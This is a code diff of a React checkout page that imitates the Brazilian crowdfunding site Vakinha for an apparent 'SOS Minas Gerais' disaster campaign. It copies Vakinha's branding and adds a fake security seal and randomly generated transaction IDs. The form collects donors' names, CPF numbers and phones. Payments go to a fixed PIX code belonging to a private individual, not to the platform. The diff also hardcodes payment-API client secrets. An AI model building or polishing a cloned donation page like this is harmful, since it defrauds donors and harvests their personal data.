@@ -132,35 +132,15 @@ export default function App() {
             <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-8" referrerPolicy="no-referrer" />
           </div>
           
-          {/* Desktop Nav */}
-          <nav className="hidden md:flex items-center gap-6 text-sm font-medium text-gray-700">
-            <a href="#" className="hover:text-green-500 transition-colors">Início</a>
-            <a href="#" className="hover:text-green-500 transition-colors">Como Funciona</a>
-            <a href="#" className="hover:text-green-500 transition-colors">Explorar</a>
-            <button className="flex items-center gap-1 text-gray-700 hover:text-green-500 transition-colors">
-              Buscar <Search size={16} />
-            </button>
-          </nav>
-
-          {/* Mobile Menu Toggle & Search */}
-          <div className="md:hidden flex items-center gap-4">
-            <button className="text-green-500 p-1">
+          <div className="flex items-center gap-4">
+            <button className="text-green-500 p-1 hover:bg-gray-50 rounded-full transition-colors">
               <Search size={24} />
             </button>
-            <button className="p-1 text-gray-600" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
-              {mobileMenuOpen ? <X size={28} /> : <Menu size={28} />}
-            </button>
+            <div className="w-10 h-10 bg-[#00a8c6] rounded-full flex items-center justify-center text-white font-bold text-sm cursor-pointer hover:bg-[#008ba3] transition-colors">
+              FH
+            </div>
           </div>
         </div>
-        
-        {/* Mobile Nav */}
-        {mobileMenuOpen && (
-          <div className="md:hidden bg-white border-t border-gray-100 p-4 flex flex-col gap-4 shadow-lg absolute w-full">
-            <a href="#" className="text-gray-700 font-medium p-2 hover:bg-gray-50 rounded-lg">Início</a>
-            <a href="#" className="text-gray-700 font-medium p-2 hover:bg-gray-50 rounded-lg">Como Funciona</a>
-            <a href="#" className="text-gray-700 font-medium p-2 hover:bg-gray-50 rounded-lg">Explorar</a>
-          </div>
-        )}
       </header>
 
       {/* Main Content */}
@@ -800,6 +780,8 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
   const [cpf, setCpf] = useState('');
   const [telefone, setTelefone] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [turbine, setTurbine] = useState(false);
+  const [receiveUpdates, setReceiveUpdates] = useState(false);
 
   const handleCopy = () => {
     navigator.clipboard.writeText('00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO R DA S SOUSA6008TRINDADE62070503***63045F6E');
@@ -835,26 +817,11 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
       }
 
       // 3. Gerar PIX via Sync Pay
-      const clientId = 'e4f27a05-1452-4122-8744-99cb70a752cf';
-      const clientSecret = '8cb6a372-6b5a-47dc-a8cd-378176c53786';
+      const clientId = '89210cff-1a37-4cd0-825d-45fecd8e77bb';
+      const clientSecret = 'dadc1b2c-86ee-4256-845a-d1511de315bb';
       
-      // Como não temos a documentação exata, vamos simular o tempo de resposta
-      // e usar um QR Code estático temporário até termos o endpoint correto
+      // Simulação
       await new Promise(resolve => setTimeout(resolve, 1500));
-      
-      // Quando tivermos a doc, o código será algo como:
-      /*
-      const authRes = await fetch('https://api.syncpayments.com.br/auth', { ... });
-      const { token } = await authRes.json();
-      
-      const pixRes = await fetch('https://api.syncpayments.com.br/v1/pix', {
-        method: 'POST',
-        headers: { 'Authorization': `Bearer ${token}` },
-        body: JSON.stringify({ value, name: nome, document: cpf })
-      });
-      const pixData = await pixRes.json();
-      setPixCode(pixData.copy_paste_code);
-      */
       
     } catch (error) {
       console.error('Erro ao processar:', error);
@@ -865,20 +832,29 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
     }
   };
 
+  const totalValue = (Number(value) || 0) + (turbine ? 4.99 : 0);
+
   return (
-    <div className="min-h-screen bg-gray-50 flex flex-col items-center font-sans text-gray-800 pb-12">
+    <div className="min-h-screen bg-white flex flex-col items-center font-sans text-gray-800 pb-12">
       {/* Header Fixo Checkout */}
-      <header className="bg-white shadow-sm sticky top-0 z-50 w-full">
-        <div className="max-w-md mx-auto px-4 h-16 flex items-center justify-between">
-          <button onClick={onBack} className="p-2 -ml-2 text-gray-600 hover:bg-gray-100 rounded-full transition-colors">
-            <ArrowLeft size={24} />
-          </button>
-          <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-7" referrerPolicy="no-referrer" />
-          <div className="w-10"></div> {/* Spacer para centralizar a logo */}
+      <header className="bg-white shadow-sm sticky top-0 z-50 w-full border-b border-gray-100">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+          <div className="flex items-center">
+            <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-8" referrerPolicy="no-referrer" />
+          </div>
+          
+          <div className="flex items-center gap-4">
+            <button className="text-[#1cb977] p-1 hover:bg-gray-50 rounded-full transition-colors">
+              <Search size={24} />
+            </button>
+            <div className="w-10 h-10 bg-[#00a8c6] rounded-full flex items-center justify-center text-white font-bold text-sm cursor-pointer hover:bg-[#008ba3] transition-colors">
+              FH
+            </div>
+          </div>
         </div>
       </header>
 
-      <div className="w-full max-w-md px-4 mt-6">
+      <div className="w-full max-w-3xl px-4 mt-8">
         {/* Info da Campanha */}
         <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-4 mb-6 flex items-center gap-4">
           <img src="https://midias.em.com.br/_midias/jpg/2026/02/24/1200x720/1_juiz-de-fora-cemig-desmente-que-havera-interrupcao-geral-de-energia-64640530.jpeg?20260224185555?20260224185555" alt="Campanha" className="w-16 h-16 rounded-xl object-cover" referrerPolicy="no-referrer" />
@@ -888,107 +864,230 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
           </div>
         </div>
 
-        {/* Card Central */}
-        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 mb-8">
-          {!pixGenerated ? (
-            <div className="space-y-6">
+        {!pixGenerated ? (
+          <div className="space-y-6">
+            <div className="text-sm text-gray-800">
+              <span className="font-bold">Olá, Flávio Henrique.</span> Não é você? <a href="#" className="text-blue-600 underline">Clique aqui</a>
+            </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
               <div>
-                <label className="block text-sm font-bold text-gray-700 mb-2">Valor da doação</label>
-                <div className="relative">
-                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">R$</span>
+                <label className="block text-sm font-bold text-gray-800 mb-2">Telefone (WhatsApp)</label>
+                <input 
+                  type="tel" 
+                  placeholder="(00) 00000 0000" 
+                  value={telefone}
+                  onChange={(e) => setTelefone(e.target.value)}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-1 focus:ring-[#1cb977] focus:border-[#1cb977] outline-none text-gray-900 transition-colors" 
+                />
+              </div>
+
+              <div>
+                <label className="block text-sm font-bold text-gray-800 mb-2">CPF</label>
+                <input 
+                  type="text" 
+                  placeholder="000.000.000-00" 
+                  value={cpf}
+                  onChange={(e) => setCpf(e.target.value)}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-1 focus:ring-[#1cb977] focus:border-[#1cb977] outline-none text-gray-900 transition-colors" 
+                />
+              </div>
+
+              <div className="md:col-span-2">
+                <label className="block text-sm font-bold text-gray-800 mb-2">Nome completo</label>
+                <input 
+                  type="text" 
+                  placeholder="Flávio Henrique" 
+                  value={nome}
+                  onChange={(e) => setNome(e.target.value)}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-1 focus:ring-[#1cb977] focus:border-[#1cb977] outline-none text-gray-900 transition-colors" 
+                />
+              </div>
+
+              <div className="md:col-span-2">
+                <label className="block text-sm font-bold text-gray-800 mb-2">Valor da contribuição</label>
+                <div className="flex">
+                  <span className="inline-flex items-center px-4 py-3 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-600 font-medium">
+                    R$
+                  </span>
                   <input 
                     type="number" 
                     placeholder="0,00" 
                     value={value}
                     onChange={(e) => setValue(e.target.value)}
-                    className="w-full pl-12 pr-4 py-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none font-bold text-gray-900 bg-gray-50 focus:bg-white transition-colors text-xl" 
+                    className="flex-1 px-4 py-3 border border-gray-300 rounded-r-md focus:ring-1 focus:ring-[#1cb977] focus:border-[#1cb977] outline-none text-gray-900 transition-colors" 
                   />
                 </div>
               </div>
-
-              <div className="pt-4 border-t border-gray-100 space-y-4">
-                <h3 className="font-bold text-gray-900 text-sm uppercase tracking-wide">Seus Dados</h3>
-                
-                <div>
-                  <label className="block text-xs font-bold text-gray-600 mb-1.5">Nome Completo</label>
-                  <input 
-                    type="text" 
-                    placeholder="Digite seu nome completo" 
-                    value={nome}
-                    onChange={(e) => setNome(e.target.value)}
-                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none text-gray-900 bg-gray-50 focus:bg-white transition-colors text-sm" 
-                  />
-                </div>
-
-                <div>
-                  <label className="block text-xs font-bold text-gray-600 mb-1.5">CPF</label>
-                  <input 
-                    type="text" 
-                    placeholder="000.000.000-00" 
-                    value={cpf}
-                    onChange={(e) => setCpf(e.target.value)}
-                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none text-gray-900 bg-gray-50 focus:bg-white transition-colors text-sm" 
-                  />
-                </div>
-
-                <div>
-                  <label className="block text-xs font-bold text-gray-600 mb-1.5">Número de Telefone</label>
-                  <input 
-                    type="tel" 
-                    placeholder="(00) 00000-0000" 
-                    value={telefone}
-                    onChange={(e) => setTelefone(e.target.value)}
-                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none text-gray-900 bg-gray-50 focus:bg-white transition-colors text-sm" 
-                  />
-                </div>
-              </div>
-
-              <button 
-                onClick={handleGeneratePix}
-                disabled={!value || Number(value) <= 0 || !nome || !cpf || !telefone || isLoading}
-                className="w-full bg-[#00c853] hover:bg-green-600 disabled:bg-green-300 text-white font-bold py-4 rounded-xl text-lg transition-all shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200 flex items-center justify-center gap-2"
-              >
-                {isLoading ? 'Processando...' : 'Continuar para o PIX'}
-              </button>
             </div>
-          ) : (
-            <div className="flex flex-col items-center space-y-6 animate-in fade-in zoom-in duration-300">
-              <div className="text-center">
-                <h3 className="font-black text-xl text-gray-900 mb-1">Quase lá!</h3>
-                <p className="text-sm text-gray-600">Copie o código abaixo para pagar no seu banco.</p>
-              </div>
 
-              <div className="p-4 bg-white border-2 border-green-100 rounded-2xl shadow-sm">
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO%20R%20DA%20S%20SOUSA6008TRINDADE62070503***63045F6E" alt="QR Code PIX" className="w-48 h-48 rounded-lg" referrerPolicy="no-referrer" />
+            <div>
+              <label className="block text-sm font-bold text-gray-800 mb-3">Forma de pagamento</label>
+              <div className="flex gap-3">
+                <div className="flex-1 flex items-center justify-center gap-2 border border-[#1cb977] rounded-md py-3 px-4 cursor-pointer text-[#1cb977]">
+                  <div className="w-4 h-4 rounded-full border border-[#1cb977]"></div>
+                  <span className="font-medium text-sm">Cartão de crédito</span>
+                </div>
+                <div className="flex-1 flex items-center justify-center gap-2 bg-[#1cb977] rounded-md py-3 px-4 cursor-pointer text-white">
+                  <div className="w-4 h-4 rounded-full border-2 border-white flex items-center justify-center">
+                    <div className="w-2 h-2 bg-white rounded-full"></div>
+                  </div>
+                  <span className="font-medium text-sm">Pix</span>
+                </div>
+              </div>
+            </div>
+
+            <div className="bg-[#eefcf1] rounded-lg p-4 border border-[#c3f0d5]">
+              <div className="flex items-center justify-between mb-4">
+                <div className="flex items-center gap-2">
+                  <input 
+                    type="checkbox" 
+                    checked={turbine}
+                    onChange={(e) => setTurbine(e.target.checked)}
+                    className="w-5 h-5 text-[#1cb977] border-gray-300 rounded focus:ring-[#1cb977]"
+                  />
+                  <span className="bg-[#1cb977] text-white text-xs font-bold px-2 py-1 rounded">TURBINE SUA DOAÇÃO</span>
+                </div>
+                <span className="font-bold text-[#1cb977]">+R$ 4,99</span>
               </div>
               
-              <div className="w-full space-y-3">
-                <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 text-center font-mono text-gray-800 font-bold break-all text-sm">
+              <div className="bg-white rounded-md p-3 mb-2 flex items-start gap-3">
+                <div className="text-xl">🍀</div>
+                <div className="flex-1">
+                  <div className="flex justify-between items-center">
+                    <span className="font-bold text-sm text-gray-800">5 números da sorte</span>
+                    <span className="text-xs text-gray-500">Grátis</span>
+                  </div>
+                  <p className="text-xs text-gray-600 mt-1">Você e quem criou a vaquinha concorrem ao sorteio de R$ 15.000,00 da Vakinha Premiada</p>
+                </div>
+              </div>
+
+              <div className="bg-white rounded-md p-3 flex items-start gap-3">
+                <div className="text-xl">💚</div>
+                <div className="flex-1">
+                  <div className="flex justify-between items-center">
+                    <span className="font-bold text-sm text-gray-800">5 corações</span>
+                    <span className="text-xs text-gray-500">R$ 4,99</span>
+                  </div>
+                  <p className="text-xs text-gray-600 mt-1">Destacam essa vaquinha na plataforma</p>
+                </div>
+              </div>
+            </div>
+
+            <div className="space-y-2 text-gray-600 pt-4">
+              <div className="flex justify-between text-sm">
+                <span>Contribuição:</span>
+                <span>R$ {Number(value || 0).toFixed(2).replace('.', ',')}</span>
+              </div>
+              <div className="flex justify-between text-sm border-t border-gray-200 pt-2">
+                <span>Total:</span>
+                <span>R$ {totalValue.toFixed(2).replace('.', ',')}</span>
+              </div>
+            </div>
+
+            <div className="flex items-start gap-3 pt-4">
+              <input 
+                type="checkbox" 
+                checked={receiveUpdates}
+                onChange={(e) => setReceiveUpdates(e.target.checked)}
+                className="w-5 h-5 mt-0.5 text-[#1cb977] border-gray-300 rounded focus:ring-[#1cb977]"
+              />
+              <div>
+                <p className="text-sm text-gray-800">Quero receber atualizações desta vaquinha e de outras iniciativas.</p>
+                <p className="text-xs text-gray-500 mt-1">Respeitamos sua privacidade, enviando apenas e-mails e WhatsApp importantes.</p>
+              </div>
+            </div>
+
+            <button 
+              onClick={handleGeneratePix}
+              disabled={!value || Number(value) <= 0 || !nome || !cpf || !telefone || isLoading}
+              className="w-full bg-[#1cb977] hover:bg-[#189e65] disabled:bg-green-300 text-white font-bold py-4 rounded-md text-xl transition-colors shadow-sm"
+            >
+              {isLoading ? 'Processando...' : 'CONTRIBUIR'}
+            </button>
+
+            <div className="bg-gray-100 rounded-md p-4 flex items-center gap-4">
+              <div className="bg-[#1a2b49] rounded-md px-3 py-2 flex items-center gap-2">
+                <Lock size={18} className="text-yellow-400" />
+                <div className="text-white text-xs font-bold leading-tight">
+                  SELO DE<br/>SEGURANÇA
+                </div>
+              </div>
+              <p className="text-sm text-[#1a2b49]">
+                Garantimos uma <strong>experiência segura</strong> para todos os nossos doadores.
+              </p>
+            </div>
+
+            <div className="text-xs text-gray-600 space-y-4 pb-8">
+              <p>Ao clicar no botão acima você declara que é maior de 18 anos, leu e está de acordo com os <a href="#" className="text-blue-500">Termos, Taxas e Prazos</a></p>
+              <p>Informamos que o preenchimento do seu cadastro completo estará disponível em seu painel pessoal na plataforma após a conclusão desta doação. Importante destacar a importância da adequação do seu cadastro, informando o nome social, caso o utilize</p>
+            </div>
+          </div>
+        ) : (
+          <div className="flex flex-col items-center space-y-6 animate-in fade-in zoom-in duration-300 bg-white p-8 rounded-xl shadow-sm border border-gray-100">
+            <div className="text-center">
+              <h2 className="font-bold text-2xl text-[#1a2b49] mb-2">Efetue o pagamento para confirmar a contribuição</h2>
+            </div>
+
+            <div className="flex items-start gap-4 bg-gray-50 p-4 rounded-lg w-full">
+              <div className="text-gray-400">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+              </div>
+              <p className="text-sm text-gray-700">
+                <strong>Clique no botão</strong> para <strong>copiar o código</strong> e escolha pagar via <strong>Pix Copia e Cola</strong> no aplicativo do seu banco.
+              </p>
+            </div>
+            
+            <div className="w-full">
+              <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
+                <div className="flex-1 p-3 font-mono text-sm text-gray-600 truncate bg-white">
                   00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO R DA S SOUSA6008TRINDADE62070503***63045F6E
                 </div>
                 <button 
                   onClick={handleCopy}
-                  className="w-full flex items-center justify-center gap-2 bg-[#eefcf1] hover:bg-green-100 text-[#00c853] font-bold py-3.5 rounded-xl transition-colors"
+                  className="p-3 bg-white border-l border-gray-300 hover:bg-gray-50 text-gray-600 transition-colors"
                 >
-                  {copied ? <Check size={20} /> : <Copy size={20} />}
-                  {copied ? 'Código copiado!' : 'Copiar código PIX'}
+                  {copied ? <Check size={20} className="text-green-500" /> : <Copy size={20} />}
                 </button>
               </div>
             </div>
-          )}
-        </div>
 
-        {/* Security Badge */}
-        <div className="flex flex-col items-center justify-center gap-3 text-gray-500 text-sm font-medium">
-          <div className="flex items-center gap-2">
-            <ShieldCheck size={18} className="text-[#00c853]" />
-            Ambiente 100% seguro
+            <a href="#" className="text-sm text-gray-600 underline">Tudo certo, já paguei!</a>
+
+            <div className="w-full text-left mt-8">
+              <h3 className="font-bold text-gray-800 uppercase text-sm mb-2">NÃO CONSEGUIU USAR O CÓDIGO? DOE USANDO A CHAVE PIX!</h3>
+              <p className="text-sm text-gray-600 mb-4">Copie a chave PIX exclusiva da vaquinha e transfira o valor via PIX, usando o aplicativo do seu banco.</p>
+              
+              <div className="flex items-center border border-gray-300 rounded-md overflow-hidden">
+                <div className="flex-1 p-3 text-sm text-gray-800 bg-white">
+                  5951671@vakinha.com.br
+                </div>
+                <button 
+                  onClick={() => {
+                    navigator.clipboard.writeText('5951671@vakinha.com.br');
+                    setCopied(true);
+                    setTimeout(() => setCopied(false), 2000);
+                  }}
+                  className="p-3 bg-white border-l border-gray-300 hover:bg-gray-50 text-gray-600 transition-colors"
+                >
+                  <Copy size={20} />
+                </button>
+              </div>
+            </div>
+
+            <div className="w-full bg-gray-100 p-6 rounded-lg flex flex-col items-center mt-6">
+              <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO%20R%20DA%20S%20SOUSA6008TRINDADE62070503***63045F6E" alt="QR Code PIX" className="w-48 h-48 mb-4 mix-blend-multiply" referrerPolicy="no-referrer" />
+              <div className="text-center text-xs text-gray-700 space-y-1">
+                <p>SOS Minas Gerais</p>
+                <p>ID Vaquinha: 5951671</p>
+                <p>ID Transação: {Math.floor(Math.random() * 100000000)}</p>
+                <p>Data: {new Date().toLocaleDateString('pt-BR')}</p>
+                <p>Valor: R$ {totalValue.toFixed(2).replace('.', ',')}</p>
+                <p>Método: Pix</p>
+              </div>
+            </div>
           </div>
-          <div className="flex items-center gap-4 text-xs">
-            <span className="flex items-center gap-1"><Lock size={14} /> Criptografia de Ponta</span>
-            <span className="flex items-center gap-1"><Check size={14} /> Dados Protegidos</span>
-          </div>
-        </div>
+        )}
       </div>
     </div>
   );
